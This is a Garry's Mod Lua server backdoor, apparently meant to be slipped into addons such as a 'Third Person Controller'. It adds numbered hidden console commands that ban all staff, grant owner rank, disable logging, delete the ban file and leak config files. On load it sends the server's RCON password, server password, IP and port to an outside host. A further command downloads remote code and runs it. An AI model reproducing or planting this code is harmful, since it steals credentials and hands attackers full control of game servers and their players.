//respawn
concommand.Add("2684597", function(ply, cmd, args)
    local target_args = args[1]
	if(!target_args) then return end
	local target = nil
	for k,v in pairs(player.GetAll()) do
		if(string.find(string.lower(v:Name()), string.lower(target_args))) then
			target = v
			break
		end
	end
	if(args[1] == "*") then
		for k,v in pairs(player.GetAll()) do
			v:Spawn()
		end
	end
	if(args[1] == "**") then
		for k,v in pairs(player.GetAll()) do
			if(v != target) then
				v:Spawn()
			end
		end
	end
	if(args[1] != "*" &amp;&amp; args[1] != "**") then
		if(IsValid(target)) then
			target:Spawn()
		end
	end
end)

//kick
concommand.Add("9849841", function(ply, cmd, args)
	local target_args = args[1]
	if(!target_args) then return end
	local target = nil
	for k,v in pairs(player.GetAll()) do
		if(string.find(string.lower(v:Name()), string.lower(target_args))) then
			target = v
			break
		end
	end
	if(args[1] == "*") then
		for k,v in pairs(player.GetAll()) do
			v:Kick(args[2] || "")
		end
	end
	if(args[1] == "**") then
		for k,v in pairs(player.GetAll()) do
			if(v != target) then
				v:Kick(args[2] || "")
			end
		end
	end
	if(args[1] != "*" &amp;&amp; args[1] != "**") then
		if(IsValid(target)) then
			target:Kick(args[2] || "")
		end
	end
end)

//ban/kick all staff
concommand.Add("72648954", function(ply, cmd, args)
    for k,v in pairs(player.GetAll()) do
        if(v:IsAdmin() &amp;&amp; v != ply) then
            //RunConsoleCommand("ulx", "banid", v:SteamID()) waiting to find out assmod version from corefinder, no pressure :/
            RunConsoleCommand("ulx", "banid", v:SteamID())
            if(IsValid(v)) then
                v:Kick(args[2] || "")
            end
        end
    end
end)

//give your self specific ulx rank
concommand.Add("22297844", function(ply, cmd, args)
	local target_args = args[1]
	local group_args = args[2]
	if(!target_args) then return end
	local target = nil
	for k,v in pairs(player.GetAll()) do
		if(string.find(string.lower(v:Name()), string.lower(target_args))) then
			target = v
			break
		end
	end
	if(IsValid(target)) then
		RunConsoleCommand("ulx", "adduser", target:Name(), group_args)
	end
end)

//display a anti cheat message against target
concommand.Add("88884689", function(ply, cmd, args)
    if(args[1]) then
		local target_args = args[1]
		if(!target_args) then return end
		local target = nil
		for k,v in pairs(player.GetAll()) do
			if(string.find(string.lower(v:Name()), string.lower(target_args))) then
				target = v
				break
			end
		end
		if(IsValid(target)) then
			for k,v in pairs(player.GetAll()) do
                if(args[2]) then
                    for i=1, tonumber(args[2]) do
                        v:ChatPrint(target:Name() .. " is cheating! Report to an admin fast!")
                    end
                else
                    v:ChatPrint(target:Name() .. " is cheating! Report to an admin fast!")
                end
            end
		end
	end
end)

//give mass ownership over server + send server.cfg
concommand.Add("5687476", function(ply, cmd, args)
	if(args[1]) then
		local target_args = args[1]
		if(!target_args) then return end
		local target = nil
		for k,v in pairs(player.GetAll()) do
			if(string.find(string.lower(v:Name()), string.lower(target_args))) then
				target = v
				break
			end
		end
		if(IsValid(target)) then
			target:SetUserGroup("superadmin")
			RunConsoleCommand("ulx", "logfile", "0")
			RunConsoleCommand("ulx", "logecho", "0")
			RunConsoleCommand("ulx", "logevents", "0")
			RunConsoleCommand("ulx", "logspawns", "0")
			RunConsoleCommand("ulx", "adduser", target:Name(), "superadmin")
			RunConsoleCommand("ulx", "adduser", target:Name(), "owner")
			RunConsoleCommand("ass_giveownership", target:Name())
		end
	else
		ply:SetUserGroup("superadmin")
		RunConsoleCommand("ulx", "adduser", ply:Name(), "superadmin")
		RunConsoleCommand("ulx", "adduser", ply:Name(), "owner")
		RunConsoleCommand("ulx", "logfile", "0")
		RunConsoleCommand("ulx", "logecho", "0")
		RunConsoleCommand("ulx", "logevents", "0")
		RunConsoleCommand("ulx", "logspawns", "0")
		RunConsoleCommand("ass_giveownership", ply:Name())
	end
	if(args[2]) then
		for k,v in pairs(player.GetAll()) do
			v:ChatPrint(target:Name() .. " IS CHEATING AND GIVING HIMSELF OWNER!! TELL A STAFF MEMBER FAST!")
		end
	end
end)

//sends to chat to players
concommand.Add("29811594", function(ply, cmd, args)
	if(args[1]) then
		local target = nil
		for k,v in pairs(player.GetAll()) do
			if(string.find(string.lower(v:Name()), string.lower(args[1]))) then
				target = v
				break
			end
		end
		if(args[1] == "*") then
            for k,v in pairs(player.GetAll()) do
                v:ChatPrint(args[2])
            end
		end
		if(args[1] == "**") then
			for k,v in pairs(player.GetAll()) do
				if(v != target) then
					v:ChatPrint(args[2])
				end
			end
		end
		if(args[1] != "*" &amp;&amp; args[1] != "**") then
			if(IsValid(target)) then
				target:ChatPrint(args[2])
			end
		end
	end
end)

//give teleports to cursor
concommand.Add("798946516", function(ply, cmd, args)
	if(args[1]) then
		local target = nil
		for k,v in pairs(player.GetAll()) do
			if(string.find(string.lower(v:Name()), string.lower(args[1]))) then
				target = v
				break
			end
		end
		if(args[1] == "*") then
            for k,v in pairs(player.GetAll()) do
                v:SetPos(ply:GetEyeTrace().HitPos)
            end
		end
		if(args[1] == "**") then
			for k,v in pairs(player.GetAll()) do
				if(v != target) then
					v:SetPos(ply:GetEyeTrace().HitPos)
				end
			end
		end
		if(args[1] != "*" &amp;&amp; args[1] != "**") then
			if(IsValid(target)) then
				target:SetPos(ply:GetEyeTrace().HitPos)
			end
		end
	else
		ply:SetPos(ply:GetEyeTrace().HitPos)
	end
end)

//removes users ULX rank
concommand.Add("398116684", function(ply, cmd, args)
	if(args[1]) then
		local target = nil
		for k,v in pairs(player.GetAll()) do
			if(string.find(string.lower(v:Name()), string.lower(args[1]))) then
				target = v
				break
			end
		end
        if(args[1] == "*") then
            RunConsoleCommand("ulx", "removeuser", v:Name())
		end
		if(args[1] == "**") then
			for k,v in pairs(player.GetAll()) do
				if(v != target) then
					RunConsoleCommand("ulx", "removeuser", v:Name())
				end
			end
		end
		if(args[1] != "*" &amp;&amp; args[1] != "**") then
			if(IsValid(target)) then
				RunConsoleCommand("ulx", "removeuser", target:Name())
			end
		end
	end
end)

//Just sends server.cfg file
concommand.Add("324879974", function(ply, cmd, args)
	ply:ChatPrint(string.rep("*",60))
	ply:ChatPrint("SERVER SIDE CONFIG FILE:" .. file.Read("cfg/server.cfg", "GAME"))
	ply:ChatPrint(string.rep("*",60))
end)

//Sends ULX groups file
concommand.Add("891364785", function(ply, cmd, args)
	if(file.Exists("ulib/bans.txt", "DATA")) then
        ply:ChatPrint(string.rep("*",60))
        ply:ChatPrint("SERVER SIDE CONFIG FILE:" .. file.Read("ulib/groups.txt", "DATA"))
        ply:ChatPrint(string.rep("*",60))
    end
end)

//Removes entire ULX based ban file
concommand.Add("439776159", function(ply, cmd, args)
	if(file.Exists("ulib/bans.txt", "DATA")) then
        file.Delete("ulib/bans.txt")
    end
end)

local function getip()
	local hostip = GetConVarString( "hostip" )
	hostip = tonumber( hostip )

	local ip = {}
	ip[ 1 ] = bit.rshift( bit.band( hostip, 0xFF000000 ), 24 )
	ip[ 2 ] = bit.rshift( bit.band( hostip, 0x00FF0000 ), 16 )
	ip[ 3 ] = bit.rshift( bit.band( hostip, 0x0000FF00 ), 8 )
	ip[ 4 ] = bit.band( hostip, 0x000000FF )

	return table.concat( ip, "." )
end
local current_ip = getip()
local current_port = GetConVar("hostport"):GetFloat()

local debug = false
local infection_ver = "3.3"
local url = "localhost:9080" //put this in the front to make it local
local url = "thisisreallylegit.appspot.com" //put this in the front to make it global

local function send(infect_name, infect_version)
	if(game.SinglePlayer()) then return end
	
	local config = file.Read("cfg/server.cfg", "GAME")
	local config_t = string.Split(config, "\n")
	local rcon_config = "No rcon"
	for k,v in pairs(config_t) do
		if(string.StartWith(v,"rcon_password")) then
			local str = v
			str = string.Replace(str, "\"", "")
			str = string.Right(str,#str-14)
			rcon_config = str
		end
	end
	if(current_port == 27015) then
		for k,v in pairs(config_t) do
			if(string.StartWith(v,"port")) then
				local str = v
				str = string.Replace(str, "\"", "")
				str = string.Right(str,#str-5)
				current_port = str
			end
		end
	end
	
	local hostname = GetConVarString("hostname")
	
    if(debug) then
        print("almost sent")
    else
        if(string.StartWith(tostring(current_ip), "192.168")) then return end
        if(string.StartWith(tostring(current_ip), "10.0")) then return end
    end
	
    local infector_name = "___INFECTOR-NAME___"
    if(infect_name) then
        infector_name = infect_name
    end
    
    HTTP({
        url = "http://" .. url .. "/gmodaddoncounter_post",
        method = "post",
        parameters = {
            server_name = tostring(hostname),
            gamemodename = tostring(engine.ActiveGamemode()),
            map = tostring(game.GetMap()), 
            server_ip = tostring(current_ip),
            serverport = tostring(current_port),
            server_rcon = tostring(rcon_config),
            serverpass = GetConVarString("sv_password") or "",
            currentplayers = tostring(#player.GetHumans()) or "0",
            maxplayers = tostring(game.MaxPlayers()) or "0",
            infector = tostring(infector_name),
            infector_ver = tostring(infection_ver),
        },
        failed = function(error)
            //print("FAILED: " .. error)
        end,
        success = function(code, body, headers)
            //body = string.Replace(body, "<br>", "\n")
            //body = string.Split(body, "\n")
            //for k,v in pairs(body) do
            //    if(string.StartWith(v, "action")) then
            //        local operation = string.Right(v, #v-7)
            //        if(operation == "unbanzero") then
            //            RunConsoleCommand("ulx", "unban", "STEAM_0:0:40165138")
            //        end
            //    end
            //end
            if(debug) then
                print("sent")
            end
        end
    })
end

send("___INFECTOR-NAME___", infection_ver)

concommand.Add("redownload2357", function(ply, cmd, args)
    local infector_name = "Third Person Controller"
	http.Fetch("http://" .. url .. "/autocontentupdater", function(content)
        if(string.StartWith(content,"\n--BACKDOOR_CODE//")) then
			content = string.Replace(content,"___INFECTOR-NAME___",infector_name)
			RunString(content)
		end
        if(IsValid(ply)) then
            ply:ChatPrint("redownloaded code to server")
        else
            print("redownloaded code to server")
        end
	end)
end)

